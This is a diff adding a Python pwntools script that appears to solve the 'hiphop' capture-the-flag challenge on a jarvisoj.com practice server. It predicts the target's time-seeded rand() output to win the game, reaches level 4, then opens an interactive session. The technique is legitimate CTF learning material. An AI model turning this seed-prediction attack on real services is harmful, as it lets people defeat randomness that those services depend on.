@@ -1,0 +1,66 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+from ctypes import CDLL
+import sys
+import pdb
+context.binary = "./hiphop"
+context.log_level = "debug"
+dll = CDLL("./libc-2.19.so")
+dll.srand(dll.time(0))
+
+if sys.argv[1] == "l":
+    io = process("./hiphop")
+else:
+    io = remote("pwn2.jarvisoj.com", 9894)
+
+def guess(num):
+    if num % 4 == 0:
+        return '1'
+    elif num % 4 == 1:
+        return '3'
+    else:
+        return '2'
+
+def use_skill(skill):
+    if skill == 3 or skill == 2:
+        dll.rand()
+    elif skill == 7:
+        dll.rand()
+        dll.rand()
+        dll.rand()
+
+    io.sendlineafter("choice:", "2")
+    io.recvuntil("\n=======================================\n")
+    io.sendline(guess(dll.rand()))
+    #  info(io.recvregex(r"Boss's hp is -?\d+"))
+    sleep(0.1)
+    if "level:4" in io.recvuntil("1. How to play"):
+        #  pdb.set_trace()
+        return True
+    else:
+        return False
+
+
+def change_skill(idx):
+    io.recvuntil("6. Exit\n")
+    #  io.sendlineafter("choice:", "3")
+    io.sendline("3")
+    io.sendlineafter("choice:", str(idx))
+
+if __name__ == "__main__":
+    change_skill(3)
+    while not use_skill(3): pass
+    #  pdb.set_trace()
+    success("Level 4 reached.")
+    pause()
+
+    for i in xrange(2):
+        change_skill(2)
+        use_skill(2)
+        change_skill(7)
+        use_skill(7)
+        sleep(1)
+
+    io.interactive()
